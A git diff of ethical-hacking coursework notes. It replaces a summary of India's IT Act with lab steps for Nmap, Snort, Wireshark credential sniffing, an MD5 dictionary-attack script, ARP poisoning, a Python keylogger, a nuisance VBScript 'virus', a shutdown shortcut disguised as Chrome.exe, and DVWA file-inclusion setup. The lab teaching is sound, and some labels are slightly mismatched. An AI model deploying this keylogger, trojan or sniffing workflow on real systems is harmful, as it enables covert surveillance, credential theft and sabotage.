@@ -1,825 +1,256 @@
-# Laws under IT Act 2000 and IT Amendment Act 2008
+## Practical 3 — Port & Network Scanning, Snort, Wireshark
 
-## **Introduction**
+### A. Port Scanning (Nmap)
 
-The Information Technology (IT) Act, 2000, provides the legal framework for e-governance, digital communication, and cybercrime regulation in India. It recognizes electronic records and digital signatures as legally valid. The IT (Amendment) Act, 2008, strengthened the original law by including data protection, privacy, and cyber terrorism provisions. Together, they form the foundation of cyber law in India, ensuring responsible use of technology.
+* Scan open ports:
 
----
+  ```
+  nmap --open 127.0.0.1
+  ```
+* Scan single port:
 
-## **Key Sections of the IT Act**
+  ```
+  nmap -p 80 127.0.0.1
+  ```
+* Scan a range of ports:
 
-### **Section 43 - Damage to Computer, Computer System, etc.**
+  ```
+  nmap -p 1-200 127.0.0.1
+  ```
+* Scan entire port range:
 
-* **Description:** Addresses unauthorized access, data theft, or damage to computer systems and networks.
-* **Case:** Bank of America Data Breach (2011) — sensitive data of nearly 90 million customers was exposed due to a stolen laptop.
-* **Penalty:** Imprisonment up to 3 years and/or fine up to ₹5 lakh.
-* **Preventive Measures:** Encrypt sensitive data, restrict access, implement cybersecurity policies.
+  ```
+  nmap -p 1-65535 127.0.0.1
+  ```
+* Fast scan (top 100):
 
-### **Section 65 - Tampering with Computer Source Documents**
+  ```
+  nmap -F 127.0.0.1
+  ```
 
-* **Description:** Intentional alteration, destruction, or concealment of computer source code.
-* **Case:** Kevin Mitnick accessed company systems, altered source codes, and stole confidential data.
-* **Penalty:** Imprisonment up to 3 years and/or fine.
-* **Preventive Measures:** Use source control systems, regular audits, strong authentication.
+### B. Network Scanning (Nmap)
 
-### **Section 66A - Sending Offensive Messages** *(Struck down in 2015)*
+* Ping scan (list live hosts):
 
-* **Description:** Penalized sending offensive or threatening electronic messages.
-* **Case:** Raja Ram Pal (2012) — accused of sending offensive political emails.
-* **Penalty:** Imprisonment up to 3 years and/or fine.
-* **Preventive Measures:** Promote responsible online behaviour.
+  ```
+  nmap -sn 192.168.1.0
+  ```
+* ARP / host scan:
 
-### **Section 66B - Dishonestly Receiving Stolen Computer Resource**
+  ```
+  nmap -sP 192.168.1.0/24
+  ```
+* DNS resolution:
 
-* **Description:** Punishes receiving or using stolen computer resources or data.
-* **Case:** Orkut Data Theft Case (2010) — stolen user data sold online for scams.
-* **Penalty:** Imprisonment up to 3 years and/or fine up to ₹1 lakh.
-* **Preventive Measures:** Verify data sources and ensure secure storage.
+  ```
+  nmap -sL 192.168.1.0
+  ```
+* OS detection:
 
-### **Section 66C - Identity Theft / Cyber Extortion**
+  ```
+  nmap -O 192.168.1.0
+  ```
+* Extra commands:
 
-* **Description:** Fraudulent use of another person’s digital identity.
-* **Case:** Unocoin Cyber Extortion Case — hackers accessed crypto wallets and demanded ransom.
-* **Penalty:** Imprisonment up to 7 years and fine.
-* **Preventive Measures:** Use two-factor authentication, secure transactions.
+  ```
+  nmap -iL filename.txt
+  nmap -A 192.168.1.0
+  nmap --traceroute 8.8.8.8
+  ```
 
-### **Section 66D - Cheating by Personation Using Computer Resource**
+### C. Snort (IDS)
 
-* **Description:** Online impersonation or fraud.
-* **Case:** Krrish 3 Piracy Case — illegal distribution of the movie through fake websites.
-* **Penalty:** Imprisonment up to 7 years and fine.
-* **Preventive Measures:** Digital rights management (DRM) and anti-piracy awareness.
+* Verify version:
 
-### **Section 66E - Violation of Privacy / Video Voyeurism**
+  ```
+  snort -V
+  ```
+* List adapters:
 
-* **Description:** Capturing or transmitting private images without consent.
-* **Case:** 2015 trial room recording incident — leaked videos sparked public outrage.
-* **Penalty:** Imprisonment up to 3 years and/or fine up to ₹2 lakh.
-* **Preventive Measures:** Surveillance only in public areas, privacy awareness.
+  ```
+  snort -W
+  ```
+* Run (sniffer):
 
-### **Section 66F - Cyber Terrorism**
+  ```
+  snort -i 6 -A console
+  ```
+* Run with config:
 
-* **Description:** Cyber activities threatening national security.
-* **Case:** Operation Aurora (2009) — hackers targeted Indian and U.S. government systems.
-* **Penalty:** Imprisonment for life.
-* **Preventive Measures:** Strengthen national cybersecurity and intelligence systems.
+  ```
+  snort -c C:\Snort\etc\snort.conf -i 6 -A console
+  ```
 
-### **Section 67A - Publishing or Transmitting Obscene Material**
-
-* **Description:** Prohibits sexually explicit content online.
-* **Case:** TV channel penalized for airing explicit content.
-* **Penalty:** Imprisonment up to 7 years and fine up to ₹10 lakh.
-* **Preventive Measures:** Content moderation and adherence to cyber ethics.
-
-### **Section 67B - Child Pornography / Abetment to Obscene Acts**
-
-* **Description:** Punishes content involving minors.
-* **Case:** Tubemate App Case — app enabled illegal downloading of obscene videos.
-* **Penalty:** Imprisonment up to 7 years and/or fine.
-* **Preventive Measures:** Monitor online content and enforce child protection.
-
-### **Section 71 - Misuse of Personal Information**
-
-* **Description:** Misuse of personal data collected for legitimate purposes.
-* **Case:** Aadhaar Data Leak — exposed sensitive citizen information.
-* **Penalty:** Imprisonment up to 7 years and fine.
-* **Preventive Measures:** Strong encryption, limited access, security checks.
-
-### **Section 72 - Breach of Confidentiality and Privacy**
-
-* **Description:** Unauthorized disclosure of confidential data.
-* **Case:** Telecom company employees leaked customer details.
-* **Penalty:** Imprisonment up to 7 years and/or fine.
-* **Preventive Measures:** NDAs, monitor employee access.
-
-### **Section 73 - Publishing False Digital Signatures**
-
-* **Description:** Creating or using false digital signatures.
-* **Case:** Fake digital certificates used in fraudulent finance transactions.
-* **Penalty:** Imprisonment up to 2 years and/or fine up to ₹1 lakh.
-* **Preventive Measures:** Verify digital signatures and secure private keys.
-
-### **Section 74 - Publication for Fraudulent Purpose**
-
-* **Description:** Use of fraudulent digital certificates or documents.
-* **Case:** Corporate fraud involving forged electronic certificates.
-* **Penalty:** Imprisonment up to 7 years and/or fine.
-* **Preventive Measures:** Validate documents and maintain audit trails.
-
----
-
-## **Conclusion**
-
-Cyber laws regulate online behaviour and protect individuals, organizations, and governments from digital threats. The IT Act 2000 and its 2008 amendment strengthen India’s cyber legal framework. Awareness, compliance, and cybersecurity best practices are essential for a safer digital ecosystem.
-
-
-# 3
-# Ethical Hacking Assignment 3 – README
-
-This README contains **accurate commands**, **explanations**, and **steps** based directly on the assignment file**. All Nmap, Snort, and Wireshark instructions are correctly structured.**
-
-> **Source: Uploaded Assignment File** fileciteturn0file0
-
----
-
-# **A. Port Scanning (Nmap)**
-
-### **1. Scan Open Ports**
-
-```
-nmap --open 127.0.0.1
-```
-
----
-
-### **2. Scan a Single Port**
-
-```
-nmap -p 80 127.0.0.1
-```
-
----
-
-### **3. Scan a Range of Ports**
-
-```
-nmap -p 1-200 127.0.0.1
-```
-
----
-
-### **4. Scan All 65535 Ports**
-
-```
-nmap -p 1-65535 127.0.0.1
-```
-
----
-
-### **5. Fast Scan (Top 100 Ports)**
-
-```
-nmap -F 127.0.0.1
-```
----
-
----
-
-# **B. Network Scanning**
-
-Nmap is used for host detection, OS detection, version checking, and network mapping.
-
-## **1. Ping Scan**
-
-Lists live hosts on the network.
-
-```
-nmap -sn 192.168.1.0
-```
-
----
-
-## **2. Host Scan (ARP Scan)**
-
-Sends ARP requests to identify active hosts.
-
-```
-nmap -sP 192.168.1.0/24
-```
-
----
-
-## **3. DNS Resolution Scan**
-
-```
-nmap -sL 192.168.1.0
-```
-
-Returns DNS names for scanned hosts.
-
----
-
-## **4. OS Detection Scan**
-
-```
-nmap -O 192.168.1.0
-```
-
----
-
-# Extra Nmap Commands
-
-### **Scan Using Targets from Text File**
-
-```
-nmap -iL filename.txt
-```
-
-### **Aggressive Scan**
-
-```
-nmap -A 192.168.1.0
-```
-
-### **Trace Route to Destination**
-
-```
-nmap --traceroute 8.8.8.8
-```
-
----
-
----
-
-# **C. Intrusion Detection – Snort**
-
-Snort is an IDS/IPS that detects malicious traffic using rules.
-
-## **Installation Requirements**
-
-* Snort for Windows
-* Npcap driver
-
----
-
-# ✔ **Snort Configuration Steps (Accurate)**
-
-### **1. Verify Snort Version**
-
-```
-snort -V
-```
-
-### **2. List All Network Adapters**
-
-```
-snort -W
-```
-
-Note the interface number you want to monitor.
-
----
-
-### **3. Prepare Required Directories**
-
-```
-C:\Snort\rules
-C:\Snort\log
-```
-
----
-
-## **4. Verify snort.conf Settings**
-
-**File:** `C:\Snort\etc\snort.conf`
+**Example `snort.conf` snippet** (Windows local testing):
 
 ```
 ipvar HOME_NET 10.119.154.0/24
 ipvar EXTERNAL_NET any
-
 var RULE_PATH C:\Snort\rules
 var LOG_PATH C:\Snort\log
-
 preprocessor frag3_global: max_frags 65536
 preprocessor frag3_engine: policy windows
 preprocessor stream5_global: track_tcp yes
 preprocessor stream5_tcp: policy windows
-
 output alert_fast: alert.fast
-
 include $RULE_PATH/local.rules
 ```
 
----
-
-## **5. Configure Local Rules**
-
-**File:** `C:\Snort\rules\local.rules`
+**local.rules examples:**
 
 ```
 alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; sid:1000001;)
-
 alert tcp any any -> any 80 (msg:"HTTP Traffic Detected"; flow:to_server,established; sid:1000002;)
-
 alert tcp any any -> any any (flags:S; msg:"TCP SYN Scan Detected"; threshold:type both, track by_src, count 5, seconds 60; sid:1000003;)
 ```
 
----
-
-## **6. Verify Existence of Snort Libraries**
-
-```
-C:\Snort\lib\snort_dynamicpreprocessor
-C:\Snort\lib\snort_dynamicengine
-C:\Snort\lib\snort_dynamicrules
-```
-
----
-
-## **7. Run Snort as Administrator**
-
-### **Sniffer Mode (Console Output)**
-
-```
-snort -i 6 -A console
-```
-
-### **IDS Mode with Config File**
-
-```
-snort -c C:\Snort\etc\snort.conf -i 6 -A console
-```
-
-**Output on Start:**
-
-```
-Initializing Network Interface 6: Intel(R) 82579LM Gigabit Network Connection
-Commencing packet processing
-```
-
----
-
-# ✔ **Testing Snort Rules**
-
-## **Test 1 – ICMP Ping**
-
-Run on another PC:
+**Test commands:**
 
 ```
 ping 10.1.5.85
-```
-
-Snort should show:
-
-```
-[**] [1:1000001:0] ICMP Ping Detected [**]
-```
-
----
-
-## **Test 2 – HTTP Traffic**
-
-Open browser → Visit any website
-nmap -sS 8.8.8.8
-
-```
-[**] [1:1000002:0] HTTP Traffic Detected [**]
-```
-
----
-
-## **Test 3 – TCP SYN Port Scan**
-
-From another PC:
-
-```
 nmap -sS 10.1.5.85
 ```
 
-Snort output:
+### D. Wireshark (Packet capture)
 
-```
-[**] [1:1000003:0] TCP SYN Scan Detected [**]
-```
+* Capture filter example:
 
----
+  ```
+  tcp port 80
+  ```
+* Display filters:
 
----
-
-# **D. Wireshark – Network Sniffing**
-
-Wireshark captures packets in real time for analysis.
-
----
-
-# ✔ **1. How Wireshark Works**
-
-* Captures traffic from a selected network interface.
-* Displays packets in real-time.
-* Allows filtering, exporting, and deep packet inspection.
+  ```
+  ip.src == 192.168.1.5
+  http
+  icmp
+  tcp.flags.syn == 1
+  ```
+* Steps: Start capture → generate traffic (e.g., visit `http://www.techpanda.org`) → stop capture → inspect POST/HTTP packets.
 
 ---
 
-# ✔ **2. Steps to Capture & Analyse Packets**
+## Practical 4 — Password Cracking, Dictionary Attack, DoS, ARP, Tools
 
-### **Step 1 – Start Wireshark**
+### A. Password Cracking
 
-Open Wireshark and select a network interface.
+* MD5 generator: use [https://www.md5hashgenerator.com/](https://www.md5hashgenerator.com/)
 
-### **Step 2 – Start Capture**
+  * `Admin12345` → `e66055e8e308770492a44bf16e875127`
+  * `Ethical@#$%Hacking` → `698543190dc248f71d96e5a4f1dd0bd2`
+* CrackStation: [https://crackstation.net/](https://crackstation.net/)
 
-Click on:
+### B. Dictionary Attack (Python)
 
-```
-Start Capturing Packets
-```
+* Script (`dictattack.py`):
 
-### **Step 3 – View Packets**
+  ```python
+  import hashlib
+  flag = 0
+  p_hash = input("Enter MD5 hash: ")
+  dictionary = input("Enter dictionary filename: ")
+  try:
+      password_file = open(dictionary, "r")
+  except FileNotFoundError:
+      print("No file found")
+      quit()
+  for word in password_file:
+      enc_word = word.strip().encode('utf-8')
+      digest = hashlib.md5(enc_word).hexdigest()
+      if digest == p_hash:
+          print("Password has been found")
+          print("Password is:", word.strip())
+          flag = 1
+          break
+  if flag == 0:
+      print("No password found")
+  ```
+* Run:
 
-Wireshark shows:
+  ```
+  python dictattack.py
+  ```
 
-* Timestamp
-* Source & Destination
-* Protocol
-* Info
+### C. Encrypt / Decrypt Passwords (online)
 
-### **Step 4 – Stop Capture**
+* DNSChecker: [https://dnschecker.org/password-encryption-utility.php](https://dnschecker.org/password-encryption-utility.php)
+* Hashes.com: [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)
 
-Click the **Stop** button.
+### D. DoS (theory)
 
----
+* Ping of Death, SYN flood, Smurf — no active commands provided (explain only).
 
-# ✔ **3. Applying Filters**
+### E. ARP Poisoning (Cain & Abel workflow)
 
-### **Capture Filter Example:**
+* GUI steps: Sniffer → select interface → scan hosts → APR tab → pair victim + gateway → start poisoning → capture.
 
-```
-tcp port 80
-```
-
-### **Display Filter Examples:**
-
-```
-ip.src == 192.168.1.5
-http
-icmp
-tcp.flags.syn == 1
-```
-
----
-
-# ✔ **4. Sniffing HTTP Credentials (Demo)**
-
-Steps from assignment:
-
-1. Start Wireshark capture
-2. Visit insecure website
-
-```
-http://www.techpanda.org/
-```
-
-3. Login with:
-
-```
-Username: admin@google.com
-Password: Password2010
-```
-
-4. Look for:
-
-```
-POST /login HTTP/1.1
-```
-
-5. Inspect packet to view credentials
-
----
-
-# ✔ **Localhost SQL Injection Example**
-
-```
-http://localhost/sqlinjection2/login.php
-```
-
-Monitor request + credentials in Wireshark.
-
----
-
-
-# 4
-
----
-
-# **A. Password Cracking**
-
-## **1. MD5 Hash Generation**
-
-Use: [https://www.md5hashgenerator.com/](https://www.md5hashgenerator.com/)
-
-### **MD5 Outputs**
-
-* **Admin12345** → `e66055e8e308770492a44bf16e875127`
-* **Ethical@#$%Hacking** → `698543190dc248f71d96e5a4f1dd0bd2`
-
----
-
-## **2. Crack Using CrackStation**
-
-Use: [https://crackstation.net/](https://crackstation.net/)
-
-Enter both MD5 hashes → CrackStation shows original passwords.
-
-### **Conclusion**
-
-Strong passwords use mixed characters and resist cracking. Simple or predictable passwords are easily cracked.
-
----
-
-# **B. Dictionary Attack (Python)**
-
-Install Python 3.7.0 → Create or download `passlist.txt` → Generate MD5 hashes using:
-[https://www.visiospark.com/password-encryption-tool/](https://www.visiospark.com/password-encryption-tool/)
-
-### **Python Script (dictattack.py)**
-
-```
-import hashlib
-flag = 0
-p_hash = input("Enter MD5 hash: ")
-dictionary = input("Enter dictionary filename: ")
-
-try:
-    password_file = open(dictionary, "r")
-except FileNotFoundError:
-    print("No file found")
-    quit()
-
-for word in password_file:
-    enc_word = word.strip().encode('utf-8')
-    digest = hashlib.md5(enc_word).hexdigest()
-
-    if digest == p_hash:
-        print("Password has been found")
-        print("Password is:", word.strip())
-        flag = 1
-        break
-
-if flag == 0:
-    print("No password found")
-```
-
-Run using:
-
-```
-python dictattack.py
-```
-
----
-
-# **C. Encrypt & Decrypt Passwords**
-
-### **Online Tool**
-
-Use: [https://dnschecker.org/password-encryption-utility.php](https://dnschecker.org/password-encryption-utility.php)
-
-Generates hashes using MD5, SHA256, SHA512, bcrypt, etc.
-
-### **Decrypt Using Hashes.com**
-
-Use: [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)
-
-Also try encrypt/decrypt with Secret Messenger Pro.
-
----
-
-# **D. DoS Attacks (Explanation)**
-
-## **1. Ping of Death**
-
-Oversized ICMP packet (> 65,535 bytes) sent in fragments → causes buffer overflow → crash/freeze.
-
-### **Steps**
-
-1. Create oversized ICMP packet.
-2. Fragment it.
-3. Target reassembles packet.
-4. Result: system crash.
-
----
-
-## **2. TCP SYN Flooding**
-
-Attacker sends many SYN packets but never sends final ACK.
-
-### **Steps**
-
-1. Send SYN flood.
-2. Server replies SYN-ACK.
-3. Attacker never replies.
-4. Server connection table fills → DoS.
-
----
-
-## **3. Smurf Attack**
-
-Attacker spoofs victim IP and ping broadcast.
-
-### **Steps**
-
-1. Send ICMP ping to broadcast.
-2. Spoof victim’s IP.
-3. All hosts reply to victim.
-4. Victim flooded.
-
----
-
-# **E. ARP Poisoning in Windows**
-
-## **Process**
-
-### **Normal Communication**
-
-* Victim asks: "Who has 192.168.1.1?"
-* Router replies with its MAC.
-* Communication works normally.
-
----
-
-### **Attack Steps**
-
-1. **Reconnaissance** → get IP/MAC of victim & router.
-2. **Send Fake ARP replies** to victim and router.
-3. **ARP Table Corruption:**
-
-   * Victim thinks hacker is router.
-   * Router thinks hacker is victim.
-4. **Traffic Interception** → Hacker reads/modifies packets.
-
----
-
-## **Using Cain & Abel for ARP Poisoning**
-
-1. Install Cain & Abel + WinPcap.
-2. Open **Sniffer** tab.
-3. Select active interface.
-4. Scan network.
-5. Go to **APR** tab.
-6. Pair victim (left) and router (right).
-7. Start poisoning.
-8. Capture passwords (Cain) or packets (Wireshark).
-9. Stop poisoning → restore ARP tables.
-
----
-
-# **F. ipconfig, ping, tracert, netstat**
-
-### **1. ipconfig**
-
-Shows IP, MAC, DNS, DHCP.
+### F. Network commands
 
 ```
 ipconfig
 ipconfig /all
-```
-
-### **2. ping**
-
-Sends ICMP echo request to check connectivity.
-
-```
 ping google.com
-```
-
-### **3. tracert**
-
-Shows path packets take to a destination.
-
-```
 tracert google.com
-```
-
-### **4. netstat**
-
-Shows network statistics & open connections.
-
-```
 netstat -an
 ```
 
----
+### G. Steganography (S-Tools)
 
-# **G. Steganography using S-Tools**
-
-### **Steps**
-
-1. Prepare secret file (ME.txt).
-2. Launch S-Tools.
-3. Drag host image (img1.bmp).
-4. Drag secret file onto image.
-5. Enter password + algorithm.
-6. Tool creates `hidden data.bmp`.
-7. To reveal → right-click → **Reveal** → Enter password.
+* Use S-Tools GUI: hide `ME.txt` inside `img1.bmp` → produce `hidden data.bmp` → reveal by entering password.
 
 ---
 
-# 5**A. Create Keylogger using Python**
+## Practical 5 — Keylogger, Virus, Trojan (Windows)
 
-A keylogger records all keystrokes typed on a keyboard. This practical demonstrates how to build a simple keylogger using `pynput` in Python.
+### A. Keylogger (Python)
 
----
+* Install:
 
-## ✅ **Python Code for Keylogger**
+  ```
+  pip install pynput
+  ```
+* Keylogger code (writes to `keyLog.txt`):
 
-```
-from pynput.keyboard import Key, Listener
-import logging
-import os
+  ```python
+  from pynput.keyboard import Key, Listener
+  import logging
+  import os
+  log_dir = r"E:/Users/mca24106/Downloads/Keylogger"
+  log_path = os.path.join(log_dir, "keyLog.txt")
+  logging.basicConfig(filename=log_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+  def on_press(key):
+      logging.info(str(key))
+  with Listener(on_press=on_press) as listener:
+      listener.join()
+  ```
 
-log_dir = r"E:/Users/mca24106/Downloads/Keylogger"
-log_path = os.path.join(log_dir, "keyLog.txt")
+> **Ethical note:** Keyloggers and malware code are provided for educational understanding only. Do not deploy on systems without explicit, lawful permission.
 
-logging.basicConfig(
-    filename=log_path,
-    level=logging.DEBUG,
-    format='%(asctime)s: %(message)s'
-)
+### B. Simple message virus (example VBScript loop)
 
-def on_press(key):
-    logging.info(str(key))
-
-with Listener(on_press=on_press) as listener:
-    listener.join()
-```
-
-# **B. Create a Virus (Simple Message Virus)**
-
-This simple “virus” repeatedly prints a message and annoys the user. (Demonstration purpose only)
-
-### **Code Example**
-
-```
-Hiii I am Virus Hiii I AM Virus Hiii I am Virus Hiii I AM Virus
-Hiii I am Virus Hiii I AM Virus Hiii I am Virus Hiii I AM Virus
+```vbscript
+set x=wscript.createobject("wscript.shell")
+do
+  wscript.sleep 100
+  x.sendkeys"{CAPSLOCK}"
+  x.sendkeys"{NUMLOCK}"
+  x.sendkeys"I am a Virus"
+  x.sendkeys" {SCROLLLOCK}"
+loop
 ```
 
-> This is NOT a real virus but a basic simulation.
+### C. Trojan via shortcut
 
-Video Reference: [https://www.youtube.com/watch?v=-TSWzErSxC4](https://www.youtube.com/watch?v=-TSWzErSxC4)
+* Create shortcut with command:
 
----
-
-# **C. Create a Simple Trojan Using Shortcut**
-
-A Trojan disguises itself as something harmless but performs a harmful action.
-
-### **Steps to Create a Shutdown Trojan**
-
-1. Right-click on Desktop → **New → Shortcut**
-2. Type the following command:
-
-```
-shutdown -s -t 50 -c "Shutdown the machine"
-```
-
-3. Click **Next** → Name it something like *Chrome.exe*, *Game.exe*, etc.
-4. Right-click the shortcut → **Properties → Change Icon**
-5. Select any attractive icon.
-
-When someone opens the shortcut, their system begins a shutdown countdown.
+  ```
+  shutdown -s -t 50 -c "Shutdown the machine"
+  ```
+* Change icon to disguise.
 
 ---
 
-
-# Practical 7 – Cryptography with CrypTool 2
-
-Source: Uploaded File fileciteturn3file0
-
----
-
-# **Using CrypTool 2 for Encryption & Decryption**
-
-CrypTool 2 allows classical and modern encryption demonstrations.
-Download: [https://www.cryptool.org/en/ct2/downloads](https://www.cryptool.org/en/ct2/downloads)
-
-Requirements:
-
-* Windows 64-bit
-* .NET Framework 4.7.2+
-
----
-
-# **A. Caesar Cipher – CrypTool 2**
-
-### **Steps:**
-
-1. Open CrypTool 2 → Click **Wizard**
-2. Select **Encryption and Decryption**
-3. Choose **Classic Encryption**
-4. Select **Caesar Cipher**
-5. Enter input → Click **Encrypt** / **Decrypt**
-
----
-
-# **B. Substitution Cipher – CrypTool 2**
-
-1. Classic Encryption → Substitution
-2. Enter plaintext
-3. Provide key / auto-generate key
-4. Encrypt / Decrypt
-
----
-
-# **C. Playfair Cipher – CrypTool 2**
-
-1. Select Playfair Cipher
-2. Enter key (e.g., PLAYFAIR)
-3. Enter plaintext
-4. Encrypt / Decrypt
-
----
-
-# **2. Caesar Cipher**
+## Practical 7 — Ceaser Ciphers (CrypTool)
 
 ```java
 import java.io.BufferedReader;
@@ -882,278 +313,35 @@ public class CaesarCipher {
 
 ---
 
-# **3. Substitution Cipher **
+## Practical 6 — DVWA, LFI/RFI, SQLi, Session Hijacking (summary & commands)
 
-```java
-import java.util.*;
-
-public class SubstitutionCipher {
-    private final String alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-    private final Map<Character, Character> encryptMap;
-    private final Map<Character, Character> decryptMap;
-    private final Random random;
-
-    public SubstitutionCipher(long seed) {
-        this.random = new Random(seed);
-        this.encryptMap = new HashMap<>();
-        this.decryptMap = new HashMap<>();
-        initializeMaps();
-    }
-
-    private void initializeMaps() {
-        char[] shuffled = alphabet.toCharArray();
-        for (int i = shuffled.length - 1; i > 0; i--) {
-            int index = random.nextInt(i + 1);
-            char temp = shuffled[index];
-            shuffled[index] = shuffled[i];
-            shuffled[i] = temp;
-        }
-
-        for (int i = 0; i < alphabet.length(); i++) {
-            char originalChar = alphabet.charAt(i);
-            char shuffledChar = shuffled[i];
-            encryptMap.put(originalChar, shuffledChar);
-            decryptMap.put(shuffledChar, originalChar);
-        }
-    }
-
-    public String encrypt(String plaintext) {
-        StringBuilder ciphertext = new StringBuilder();
-        for (char c : plaintext.toCharArray()) {
-            ciphertext.append(encryptMap.getOrDefault(c, c));
-        }
-        return ciphertext.toString();
-    }
-
-    public String decrypt(String ciphertext) {
-        StringBuilder plaintext = new StringBuilder();
-        for (char c : ciphertext.toCharArray()) {
-            plaintext.append(decryptMap.getOrDefault(c, c));
-        }
-        return plaintext.toString();
-    }
-
-    public static void main(String[] args) {
-        SubstitutionCipher cipher = new SubstitutionCipher(12345);
-        String plaintext = "Hello there!";
-        String encrypted = cipher.encrypt(plaintext);
-        String decrypted = cipher.decrypt(encrypted);
-        System.out.println("Encrypted: " + encrypted);
-        System.out.println("Decrypted: " + decrypted);
-    }
-}
-```
-
----
-
-# **4. Playfair Cipher **
-
-```java
-import java.util.*;
-
-public class PlayfairCipher {
-    private static final String ALPHABET = "ABCDEFGHIKLMNOPQRSTUVWXYZ";
-    private char[][] keyMatrix = new char[5][5];
-
-    private static String preprocessText(String text) {
-        return text.toUpperCase().replaceAll(" ", "").replace('J', 'I');
-    }
-
-    private static String prepareDigraphs(String text) {
-        StringBuilder newText = new StringBuilder(text);
-        for (int i = 0; i < newText.length() - 1; i += 2) {
-            if (newText.charAt(i) == newText.charAt(i + 1)) newText.insert(i + 1, 'X');
-        }
-        if (newText.length() % 2 != 0) newText.append('Z');
-        return newText.toString();
-    }
-
-    private void generateKeyMatrix(String key) {
-        Set<Character> used = new LinkedHashSet<>();
-        for (char c : key.toUpperCase().toCharArray()) {
-            if (!used.contains(c) && ALPHABET.indexOf(c) != -1) used.add(c);
-        }
-        for (char c : ALPHABET.toCharArray()) if (!used.contains(c)) used.add(c);
-
-        Iterator<Character> it = used.iterator();
-        for (int i = 0; i < 5; i++) for (int j = 0; j < 5; j++) keyMatrix[i][j] = it.next();
-    }
-
-    private int[] searchElement(char letter) {
-        for (int i = 0; i < 5; i++) for (int j = 0; j < 5; j++) if (keyMatrix[i][j] == letter) return new int[]{i, j};
-        return null;
-    }
-
-    private String encryptText(String text) {
-        StringBuilder cipherText = new StringBuilder();
-        for (int i = 0; i < text.length(); i += 2) {
-            char a = text.charAt(i), b = text.charAt(i + 1);
-            int[] p1 = searchElement(a), p2 = searchElement(b);
-            if (p1[0] == p2[0]) {
-                cipherText.append(keyMatrix[p1[0]][(p1[1] + 1) % 5]);
-                cipherText.append(keyMatrix[p2[0]][(p2[1] + 1) % 5]);
-            } else if (p1[1] == p2[1]) {
-                cipherText.append(keyMatrix[(p1[0] + 1) % 5][p1[1]]);
-                cipherText.append(keyMatrix[(p2[0] + 1) % 5][p2[1]]);
-            } else {
-                cipherText.append(keyMatrix[p1[0]][p2[1]]);
-                cipherText.append(keyMatrix[p2[0]][p1[1]]);
-            }
-        }
-        return cipherText.toString();
-    }
-
-    private String decryptText(String text) {
-        StringBuilder plainText = new StringBuilder();
-        for (int i = 0; i < text.length(); i += 2) {
-            char a = text.charAt(i), b = text.charAt(i + 1);
-            int[] p1 = searchElement(a), p2 = searchElement(b);
-            if (p1[0] == p2[0]) {
-                plainText.append(keyMatrix[p1[0]][(p1[1] - 1 + 5) % 5]);
-                plainText.append(keyMatrix[p2[0]][(p2[1] - 1 + 5) % 5]);
-            } else if (p1[1] == p2[1]) {
-                plainText.append(keyMatrix[(p1[0] - 1 + 5) % 5][p1[1]]);
-                plainText.append(keyMatrix[(p2[0] - 1 + 5) % 5][p2[1]]);
-            } else {
-                plainText.append(keyMatrix[p1[0]][p2[1]]);
-                plainText.append(keyMatrix[p2[0]][p1[1]]);
-            }
-        }
-        return plainText.toString();
-    }
-
-    public static void main(String[] args) {
-        PlayfairCipher cipher = new PlayfairCipher();
-        String key = "PLAYFAIR";
-        String text = "HELLO WORLD";
-
-        text = preprocessText(text);
-        text = prepareDigraphs(text);
-        cipher.generateKeyMatrix(key);
-
-        String encrypted = cipher.encryptText(text);
-        String decrypted = cipher.decryptText(encrypted);
-
-        System.out.println("Encrypted: " + encrypted);
-        System.out.println("Decrypted: " + decrypted);
-    }
-}
-```
-
-
-# 6
-
-```
-C:\xampp\htdocs\DVWA
-```
-
-Use Git Bash / PowerShell:
+### DVWA setup (clone into XAMPP htdocs)
 
 ```
 cd C:/xampp/htdocs
 git clone https://github.com/digininja/DVWA.git
 ```
 
----
-
-### **2. Start XAMPP & Run Apache + MySQL**
-
-* Open **XAMPP Control Panel**
-* Start **Apache**
-* Start **MySQL**
-
----
-
-### **3. Open DVWA project in VS Code**
-
-* File → **Open Folder** → Select:
+Start XAMPP → Apache + MySQL
+Open `C:\xampp\htdocs\DVWA` in VS Code
+Rename `config/config.inc.php.dist` → `config/config.inc.php` and set:
 
 ```
-C:\xampp\htdocs\DVWA
+$_DVWA['db_user'] = 'root';
+$_DVWA['db_password'] = '';
 ```
 
----
-
-### **4. Configure DVWA Settings**
-
-Go to:
-
-```
-DVWA/config/
-```
-
-Rename:
-
-```
-config.inc.php.dist → config.inc.php
-```
-
----
-
-### **5. Set database user and password**
-
-Open **config.inc.php** → find DB section:
-
-```
-$_DVWA[ 'db_user' ] = 'root';
-$_DVWA[ 'db_password' ] = '';
-```
-
-Make sure password is **empty**.
-
----
-
-### **6. Run DVWA Setup Page**
-
-In browser, open:
+Visit:
 
 ```
 http://localhost/DVWA/setup.php
 ```
 
-Click:
+Click **Create / Reset Database** → Login (admin/password) → Set security to **Low**
 
-```
-Create / Reset Database
-```
+### Apache & PHP changes (for RFI testing)
 
----
-
-### **7. Login to DVWA**
-
-Use default credentials:
-
-```
-Username: admin
-Password: password
-```
-
----
-
-### **8. Set DVWA Security to Low**
-
-Inside DVWA:
-
-* Go to **DVWA Security** tab
-* Change security level to **Low**
-
----
-
-### **9. Update Apache Configuration (For File Inclusion)**
-
-Open:
-
-```
-XAMPP Control Panel → Apache → Config → httpd.conf
-```
-
-AND:
-
-```
-Apache → Config → httpd-xampp.conf
-```
-
-Add this block:
+Add to `httpd.conf` or `httpd-xampp.conf`:
 
 ```apache
 <Directory "C:/xampp/htdocs">
@@ -1162,72 +350,37 @@ Add this block:
 </Directory>
 ```
 
-Save and restart Apache.
-
----
-
-### **10. Update PHP Settings**
-
-Open:
-
-```
-C:\xampp\php\php.ini
-```
-
-Search for:
-
-```
-allow_url_include
-```
-
-Change:
-
-```
-allow_url_include = Off
-```
-
-TO:
+In `C:\xampp\php\php.ini`:
 
 ```
 allow_url_include = On
 ```
 
-Save file and **restart Apache**.
+Restart Apache.
 
----
+### LFI/RFI testing
 
-# **3. Perform Local File Inclusion (LFI)**
-
-Open DVWA File Inclusion module:
+Open file inclusion module:
 
 ```
 http://localhost/DVWA-master/vulnerabilities/fi/?page=include.php
 ```
 
-Replace parameter:
+Include local file:
 
 ```
 ?page=http://localhost/sqlinjection/login.php
